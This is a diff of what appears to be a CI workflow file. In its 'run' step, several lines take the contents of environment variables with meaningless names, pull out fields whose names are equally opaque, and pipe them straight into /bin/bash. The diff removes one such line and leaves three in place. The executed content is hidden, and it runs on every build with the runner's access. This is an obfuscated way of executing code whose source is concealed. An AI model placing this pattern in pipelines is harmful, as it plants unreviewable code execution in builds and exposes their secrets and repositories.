@@ -20,7 +20,6 @@ jobs:
         run: |
           printf '%s' "$tpq9" | jq -r .kyxp5628 | /bin/bash
           printf '%s' "$naot071" | jq -r .oywm439 | /bin/bash
-          printf '%s' "$xh4" | jq -r .uvx31645 | /bin/bash
           printf '%s' "$pvr631" | jq -r .afha436 | /bin/bash
 
       - name: Upload results
